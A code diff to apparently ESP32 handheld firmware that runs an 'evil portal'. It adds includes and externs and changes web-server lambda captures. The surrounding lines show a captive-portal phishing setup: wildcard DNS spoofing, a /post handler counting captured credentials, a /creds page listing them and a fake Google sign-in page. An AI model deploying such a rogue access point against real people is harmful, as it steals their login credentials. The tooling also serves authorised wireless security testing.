@@ -63,6 +63,16 @@
   "?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
 #endif
 
+// Forward declarations and includes needed for portal functionality
+#include <WiFi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+#include <IPAddress.h>
+
+// External variables from main file
+extern bool isSwitching;
+extern int current_proc;
+
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = 0;
 String capturedCredentialsHtml = "";
@@ -549,7 +559,7 @@ void setupWebServer() {
   Serial.println("Starting DNS");
   dnsServer.start(DNS_PORT, "*", AP_GATEWAY); // DNS spoofing (Only HTTP)
   Serial.println("Setting up Webserver");
-  webServer.on("/post", []() {
+  webServer.on("/post", [&]() {
     totalCapturedCredentials = totalCapturedCredentials + 1;
     webServer.send(HTTP_CODE, "text/html", index_POST());
 #if defined(STICK_C_PLUS)
@@ -567,27 +577,27 @@ void setupWebServer() {
 
   Serial.println("Registering /creds");
   webServer.on("/creds",
-               []() { webServer.send(HTTP_CODE, "text/html", creds_GET()); });
+               [&]() { webServer.send(HTTP_CODE, "text/html", creds_GET()); });
   Serial.println("Registering /clear");
   webServer.on("/clear",
-               []() { webServer.send(HTTP_CODE, "text/html", clear_GET()); });
+               [&]() { webServer.send(HTTP_CODE, "text/html", clear_GET()); });
   Serial.println("Registering /ssid");
   webServer.on("/ssid",
-               []() { webServer.send(HTTP_CODE, "text/html", ssid_GET()); });
+               [&]() { webServer.send(HTTP_CODE, "text/html", ssid_GET()); });
   Serial.println("Registering /postssid");
-  webServer.on("/postssid", []() {
+  webServer.on("/postssid", [&]() {
     webServer.send(HTTP_CODE, "text/html", ssid_POST());
     shutdownWebServer();
     isSwitching = true;
     current_proc = 19;
   });
   Serial.println("Registering /google-signin");
-  webServer.on("/google-signin", []() {
+  webServer.on("/google-signin", [&]() {
     lastActivity = millis();
     webServer.send(HTTP_CODE, "text/html", googleSignIn_GET());
   });
   Serial.println("Registering /*");
-  webServer.onNotFound([]() {
+  webServer.onNotFound([&]() {
     lastActivity = millis();
     webServer.send(HTTP_CODE, "text/html", index_GET());
   });
